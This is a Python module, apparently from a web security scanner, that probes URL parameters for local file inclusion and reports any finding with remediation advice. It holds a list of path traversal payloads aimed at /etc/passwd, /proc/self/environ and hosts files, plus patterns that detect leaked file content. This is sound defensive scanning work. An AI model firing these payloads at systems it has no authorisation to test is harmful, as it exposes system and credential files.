"""
Local File Inclusion (LFI) / Path Traversal Module (v1.2.0)
Learned from: Greaper (lfi.py), GSEC (path_traversal.py), Wapiti (mod_file.py)
"""
from __future__ import annotations
import re
from typing import List
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from webshield.core.models import Finding, Severity
from webshield.core.http import get_client

LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "../../windows/system32/drivers/etc/hosts",
    "../../etc/hosts",
    "../../proc/self/environ",
]

LFI_SUCCESS_PATTERNS = [
    re.compile(r"root:[x*]?:0:0:"),
    re.compile(r"daemon:[x*]?:\d+:\d+:"),
    re.compile(r"\[boot loader\]", re.I),
    re.compile(r"127\.0\.0\.1\s+localhost"),
    re.compile(r"HTTP_USER_AGENT"),
    re.compile(r"DOCUMENT_ROOT="),
    re.compile(r"bin:/(?:bin|sbin|usr)"),
]

FILE_PARAMS = [
    "file", "path", "page", "include", "template", "view",
    "doc", "document", "load", "read", "source", "lang",
    "language", "conf", "config", "dir", "folder",
]


def scan(url: str, timeout: float = 10.0) -> List[Finding]:
    findings: List[Finding] = []
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query, keep_blank_values=True).keys())

    # Only test params that look file-related, or all params if few exist
    test_params = [p for p in params if p.lower() in FILE_PARAMS]
    if not test_params:
        test_params = params[:3]
    if not test_params:
        return []

    with get_client(timeout=min(timeout, 7.0)) as client:
        try:
            baseline = client.get(url).text
        except Exception:
            return []

        for param in test_params[:3]:
            for payload in LFI_PAYLOADS:
                all_params = parse_qs(parsed.query, keep_blank_values=True)
                new_p = {k: v[0] if isinstance(v, list) else v for k, v in all_params.items()}
                new_p[param] = payload
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, urlencode(new_p), ""
                ))
                try:
                    body = client.get(test_url).text
                except Exception:
                    continue

                if body == baseline:
                    continue

                for pattern in LFI_SUCCESS_PATTERNS:
                    if pattern.search(body):
                        findings.append(Finding(
                            title=f"Local File Inclusion (LFI) — param: {param}",
                            severity=Severity.CRITICAL,
                            description=(
                                f"The '{param}' parameter is vulnerable to Local File Inclusion. "
                                f"Payload '{payload}' returned system file content. "
                                "Attackers can read /etc/passwd, config files, SSH keys, "
                                "source code, and potentially execute code via log poisoning."
                            ),
                            evidence=(
                                f"Parameter: {param}\n"
                                f"Payload: {payload}\n"
                                f"Pattern matched: {pattern.pattern}\n"
                                f"Response: {body[:200]}"
                            ),
                            remediation=(
                                "Never pass user input directly to file system functions. "
                                "Use a whitelist of allowed filenames. "
                                "Resolve and validate the absolute path stays within the allowed directory."
                            ),
                            code_fix=(
                                "import os\n\n"
                                "ALLOWED_DIR = '/var/www/templates/'\n\n"
                                "def safe_include(filename):\n"
                                "    # Resolve to absolute path\n"
                                "    full_path = os.path.realpath(\n"
                                "        os.path.join(ALLOWED_DIR, filename)\n"
                                "    )\n"
                                "    # Verify it stays within allowed directory\n"
                                "    if not full_path.startswith(ALLOWED_DIR):\n"
                                "        raise ValueError('Path traversal detected')\n"
                                "    return full_path"
                            ),
                            reference="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
                            cvss=9.8,
                        ))
                        return findings
    return findings
